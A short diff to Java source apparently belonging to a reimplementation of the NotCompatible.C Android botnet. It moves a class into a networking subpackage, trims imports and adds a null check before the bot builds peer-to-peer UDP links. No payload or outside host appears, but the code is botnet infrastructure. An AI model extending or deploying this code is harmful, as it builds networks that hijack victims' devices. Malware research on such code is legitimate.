@@ -1,4 +1,4 @@
-package diff.notcompatible.c.bot;
+package diff.notcompatible.c.bot.net;
 
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
@@ -11,8 +11,6 @@ import java.net.InetSocketAddress;
 import java.util.logging.Logger;
 
 import diff.notcompatible.c.bot.crypto.RSA;
-import diff.notcompatible.c.bot.net.ConnectionManager;
-import diff.notcompatible.c.bot.net.NIOServer;
 import diff.notcompatible.c.bot.net.tcp.Link;
 import diff.notcompatible.c.bot.net.tcp.Link.LinkStatus;
 import diff.notcompatible.c.bot.net.tcp.P2PLink;
@@ -258,7 +256,7 @@ public class ThreadServer implements Runnable {
 				}
     		}
     		
-    		if(udpMixer.getConnections() > 0 && udpMixer.getConnections() < 0x32) {
+    		if(udpMixer != null && udpMixer.getConnections() > 0 && udpMixer.getConnections() < 0x32) {
     			udpMixer.createU2ULink();
     		}
     	}
